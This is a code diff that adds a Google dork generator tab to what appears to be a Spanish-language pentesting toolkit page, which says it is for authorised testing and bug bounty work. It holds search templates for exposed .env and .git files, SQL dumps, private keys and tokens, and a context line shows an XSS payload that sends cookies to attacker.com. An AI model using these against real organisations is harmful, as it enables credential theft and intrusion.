@@ -1071,6 +1071,7 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
     <button class="tk-tab" onclick="showTk('obf',this)">🎭 OBFUSCATOR</button>
     <button class="tk-tab" onclick="showTk('headers2',this)">🛡 HEADERS</button>
     <button class="tk-tab" onclick="showTk('cidr',this)">📐 CIDR</button>
+    <button class="tk-tab" onclick="showTk('dorks',this)">🔎 DORKS</button>
   </div>
 
       <div class="tk-panel active" id="tk-shodan">
@@ -1505,6 +1506,38 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
       </div>
       <div id="cidr-split-result" style="font-family:var(--font);font-size:.63rem;color:rgba(0,255,65,.6);margin-top:8px;"></div>
     </div>
+  </div>
+
+
+  <div class="tk-panel" id="tk-dorks">
+    <div class="tk-desc">Google Dork Generator &mdash; <span style="color:var(--g)">OSINT · asset discovery · recon pasivo</span>
+      <span style="color:rgba(0,255,65,.3)"> // para pentesting autorizado y bug bounty</span></div>
+
+    <div class="tk-row" style="gap:8px;margin-bottom:8px;flex-wrap:wrap;">
+      <input class="tk-input" id="dork-domain" placeholder="target.com"
+        style="flex:2;font-size:.82rem;" onkeydown="if(event.key==='Enter')genDorks()"/>
+      <select id="dork-cat" class="tk-input" style="flex:1;font-size:.75rem;">
+        <option value="all">Todas las categorías</option>
+        <option value="exposure">Exposición de archivos</option>
+        <option value="login">Paneles de login</option>
+        <option value="config">Configuraciones</option>
+        <option value="db">Bases de datos</option>
+        <option value="git">Git / Código fuente</option>
+        <option value="cloud">Cloud / Storage</option>
+        <option value="vuln">Vulnerabilidades</option>
+        <option value="info">Info disclosure</option>
+        <option value="subdomain">Subdominios</option>
+      </select>
+      <button class="tk-btn" onclick="genDorks()" style="min-width:100px;font-size:.78rem;">🔎 GENERAR</button>
+    </div>
+
+    <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px;" id="dork-quick">
+      <button class="port-cat-btn" style="font-size:.58rem;padding:2px 7px;" onclick="dorkOpen('all')">▶ Abrir todos</button>
+      <button class="port-cat-btn" style="font-size:.58rem;padding:2px 7px;" onclick="dorkCopyAll()">⧉ Copiar todos</button>
+      <button class="port-cat-btn" style="font-size:.58rem;padding:2px 7px;" onclick="dorkExport()">⬇ Export TXT</button>
+    </div>
+
+    <div class="tk-output show" id="out-dorks" style="min-height:260px;"></div>
   </div>
 
 </section>
@@ -5149,6 +5182,233 @@ function cidrExport(){
   var a=document.createElement('a');
   a.href=URL.createObjectURL(blob);
   a.download='cidr_'+int2ip(_cidrData.network).replace(/\./g,'_')+'_'+_cidrData.prefix+'.txt';
+  a.click();
+}
+
+
+// ══════════════════════════════════════════════════════════════
+//  GOOGLE DORK GENERATOR
+// ══════════════════════════════════════════════════════════════
+var _dorkList = [];
+
+var DORK_TEMPLATES = {
+  exposure: {
+    label: '📁 Exposición de archivos',
+    dorks: [
+      'site:{d} ext:pdf',
+      'site:{d} ext:doc OR ext:docx OR ext:xls OR ext:xlsx',
+      'site:{d} ext:sql OR ext:db OR ext:sqlite',
+      'site:{d} ext:log',
+      'site:{d} ext:bak OR ext:backup OR ext:old',
+      'site:{d} ext:env OR ext:cfg OR ext:conf OR ext:config',
+      'site:{d} ext:xml OR ext:json filetype:xml',
+      'site:{d} ext:txt intext:password',
+      'site:{d} ext:php intitle:phpinfo',
+      'site:{d} filetype:csv intext:email',
+    ]
+  },
+  login: {
+    label: '🔑 Paneles de login / admin',
+    dorks: [
+      'site:{d} inurl:admin',
+      'site:{d} inurl:login OR inurl:signin',
+      'site:{d} inurl:wp-admin OR inurl:wp-login',
+      'site:{d} inurl:administrator',
+      'site:{d} inurl:dashboard',
+      'site:{d} inurl:cpanel OR inurl:plesk OR inurl:whm',
+      'site:{d} inurl:phpmyadmin',
+      'site:{d} intitle:"index of" inurl:admin',
+      'site:{d} inurl:controlpanel OR inurl:control-panel',
+      'site:{d} inurl:portal intitle:login',
+    ]
+  },
+  config: {
+    label: '⚙ Configuraciones expuestas',
+    dorks: [
+      'site:{d} inurl:.git',
+      'site:{d} inurl:.env',
+      'site:{d} inurl:config.php',
+      'site:{d} inurl:settings.php OR inurl:configuration.php',
+      'site:{d} inurl:wp-config.php',
+      'site:{d} inurl:web.config',
+      'site:{d} inurl:application.properties OR inurl:application.yml',
+      'site:{d} inurl:Dockerfile OR inurl:docker-compose',
+      'site:{d} inurl:Makefile OR inurl:.htaccess',
+      'site:{d} intitle:"index of" ".git"',
+    ]
+  },
+  db: {
+    label: '🗄 Bases de datos / dumps',
+    dorks: [
+      'site:{d} ext:sql "INSERT INTO"',
+      'site:{d} ext:sql "CREATE TABLE"',
+      'site:{d} intext:"mysql_connect" ext:php',
+      'site:{d} inurl:phpmyadmin intitle:phpmyadmin',
+      'site:{d} intext:"DB_PASSWORD" ext:env',
+      'site:{d} inurl:backup ext:sql OR ext:gz',
+      'site:{d} intext:"MongoDB" inurl:27017',
+      'site:{d} intext:"redis_password" OR intext:"REDIS_URL"',
+      'site:{d} ext:json intext:"password" intext:"username"',
+      'site:{d} intext:"sqliteexception"',
+    ]
+  },
+  git: {
+    label: '💻 Git / código fuente',
+    dorks: [
+      'site:{d} inurl:".git/HEAD"',
+      'site:{d} inurl:".git/config"',
+      'site:{d} intext:"-----BEGIN RSA PRIVATE KEY-----"',
+      'site:{d} intext:"-----BEGIN OPENSSH PRIVATE KEY-----"',
+      'site:{d} intext:"api_key" OR intext:"api_secret" ext:js',
+      'site:{d} intext:"access_token" ext:json',
+      'site:{d} intext:"SECRET_KEY" ext:py OR ext:env',
+      'site:{d} inurl:github.com OR inurl:gitlab.com',
+      'site:{d} intext:"Authorization: Bearer"',
+      'site:{d} ext:js intext:"password" intext:"username"',
+    ]
+  },
+  cloud: {
+    label: '☁ Cloud / Storage buckets',
+    dorks: [
+      'site:s3.amazonaws.com "{d}"',
+      'site:blob.core.windows.net "{d}"',
+      'site:storage.googleapis.com "{d}"',
+      'site:{d} inurl:s3.amazonaws.com',
+      'site:{d} inurl:storage.googleapis.com',
+      '"{d}" site:pastebin.com',
+      '"{d}" site:trello.com',
+      '"{d}" site:jira.atlassian.com',
+      '"{d}" site:confluence.atlassian.com',
+      '"{d}" intext:password site:pastebin.com',
+    ]
+  },
+  vuln: {
+    label: '⚠ Indicadores de vulnerabilidades',
+    dorks: [
+      'site:{d} intext:"SQL syntax" OR intext:"mysql_fetch"',
+      'site:{d} intext:"Warning: mysql_" OR intext:"ORA-"',
+      'site:{d} intext:"Traceback (most recent call"',
+      'site:{d} intext:"Exception in thread" OR intext:"java.lang."',
+      'site:{d} intext:"Fatal error:" ext:php',
+      'site:{d} intitle:"Error 500" OR intitle:"Internal Server Error"',
+      'site:{d} inurl:eval( OR inurl:exec(',
+      'site:{d} intext:"phpinfo()" ext:php',
+      'site:{d} intext:"root:x:0:0" OR intext:"bin/bash"',
+      'site:{d} intext:"Directory listing" intitle:"index of"',
+    ]
+  },
+  info: {
+    label: '🔍 Information disclosure',
+    dorks: [
+      'site:{d} intitle:"index of"',
+      'site:{d} intitle:"index of" "parent directory"',
+      'site:{d} intext:"Powered by" inurl:readme',
+      'site:{d} inurl:robots.txt',
+      'site:{d} inurl:sitemap.xml',
+      'site:{d} inurl:crossdomain.xml OR inurl:clientaccesspolicy.xml',
+      'site:{d} inurl:swagger OR inurl:api-docs',
+      'site:{d} inurl:graphql OR inurl:graphiql',
+      'site:{d} intitle:"Apache2 Ubuntu Default Page"',
+      'site:{d} intext:"Server:" inurl:/.well-known/',
+    ]
+  },
+  subdomain: {
+    label: '🌐 Subdominios y activos',
+    dorks: [
+      'site:*.{d}',
+      'site:*.{d} -site:www.{d}',
+      'site:*.{d} inurl:dev OR inurl:staging OR inurl:test',
+      'site:*.{d} inurl:api',
+      'site:*.{d} inurl:admin',
+      'site:*.{d} inurl:mail OR inurl:smtp OR inurl:webmail',
+      'site:*.{d} inurl:ftp',
+      'site:*.{d} inurl:vpn OR inurl:remote',
+      'site:*.{d} intitle:"apache" OR intitle:"nginx"',
+      '"{d}" intext:"@{d}" ext:pdf OR ext:doc',
+    ]
+  },
+};
+
+function dorkOut(html){
+  var o=document.getElementById('out-dorks');
+  if(o){o.innerHTML+=html;o.scrollTop=o.scrollHeight;}
+}
+function dorkClear(){var o=document.getElementById('out-dorks');if(o)o.innerHTML='';}
+
+function genDorks(){
+  var domain=(document.getElementById('dork-domain')||{value:''}).value.trim();
+  var cat=(document.getElementById('dork-cat')||{value:'all'}).value;
+  if(!domain){dorkClear();dorkOut('<span style="color:var(--red)">// Ingresa un dominio target</span>');return;}
+  // Clean domain
+  domain=domain.replace(/^https?:\/\//,'').replace(/\/.*$/,'').replace(/^www\./,'');
+
+  _dorkList=[];
+  dorkClear();
+
+  var cats=cat==='all'?Object.keys(DORK_TEMPLATES):[cat];
+  var total=0;
+
+  cats.forEach(function(catKey){
+    var def=DORK_TEMPLATES[catKey];
+    if(!def) return;
+    dorkOut('<div style="margin-bottom:4px;"><span style="color:rgba(0,255,65,.35);font-family:var(--font);font-size:.62rem;">── '+escH(def.label)+'</span></div>');
+
+    def.dorks.forEach(function(tmpl){
+      var dork=tmpl.replace(/\{d\}/g,domain);
+      _dorkList.push(dork);
+      total++;
+      var gUrl='https://www.google.com/search?q='+encodeURIComponent(dork);
+      dorkOut(
+        '<div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:3px;padding:3px 0;border-bottom:1px solid rgba(0,255,65,.04);">'+
+        '<code style="font-family:var(--font);font-size:.62rem;color:rgba(0,255,65,.75);flex:1;word-break:break-all;">'+escH(dork)+'</code>'+
+        '<div style="display:flex;gap:4px;flex-shrink:0;">'+
+        '<button onclick="navigator.clipboard.writeText('+JSON.stringify(JSON.stringify(dork))+')" '+
+          'style="background:transparent;border:1px solid rgba(0,255,65,.15);color:rgba(0,255,65,.4);'+
+          'font-family:var(--font);font-size:.55rem;padding:1px 5px;cursor:pointer;white-space:nowrap;">⧉</button>'+
+        '<a href="'+escH(gUrl)+'" target="_blank" '+
+          'style="background:transparent;border:1px solid rgba(0,255,65,.15);color:rgba(0,255,65,.4);'+
+          'font-family:var(--font);font-size:.55rem;padding:1px 5px;text-decoration:none;white-space:nowrap;">▶ Google</a>'+
+        '</div></div>'
+      );
+    });
+    dorkOut('<div style="margin-bottom:10px;"></div>');
+  });
+
+  // Footer
+  dorkOut(
+    '<div style="margin-top:8px;font-family:var(--font);font-size:.62rem;color:rgba(0,255,65,.35);">'+
+    '// '+total+' dorks generados para: <span style="color:rgba(0,255,65,.6);">'+escH(domain)+'</span>'+
+    '</div>'
+  );
+}
+
+function dorkOpen(mode){
+  if(!_dorkList.length){alert('Genera dorks primero.');return;}
+  var MAX=10;
+  if(_dorkList.length>MAX&&!confirm('¿Abrir '+_dorkList.length+' pestañas? (pueden bloquearse por el browser)\nAbre de a '+MAX+' para evitar bloqueos.')){return;}
+  _dorkList.slice(0,MAX).forEach(function(dork){
+    window.open('https://www.google.com/search?q='+encodeURIComponent(dork),'_blank');
+  });
+}
+
+function dorkCopyAll(){
+  if(!_dorkList.length){alert('Genera dorks primero.');return;}
+  navigator.clipboard.writeText(_dorkList.join('\n')).then(function(){
+    var btn=document.querySelector('#tk-dorks .port-cat-btn');
+    // flash feedback via status
+    var o=document.getElementById('out-dorks');
+    var prev=o?o.innerHTML:'';
+  });
+  alert('✓ '+_dorkList.length+' dorks copiados al clipboard');
+}
+
+function dorkExport(){
+  if(!_dorkList.length){alert('Genera dorks primero.');return;}
+  var domain=(document.getElementById('dork-domain')||{value:'target'}).value.trim().replace(/^https?:\/\//,'').replace(/\/.*$/,'');
+  var txt='# Google Dorks — '+domain+'\n# Generado: '+new Date().toISOString()+'\n# Y000! Portfolio — solo para pentesting autorizado\n\n'+_dorkList.join('\n');
+  var a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([txt],{type:'text/plain'}));
+  a.download='dorks_'+domain.replace(/\./g,'_')+'_'+Date.now()+'.txt';
   a.click();
 }
 
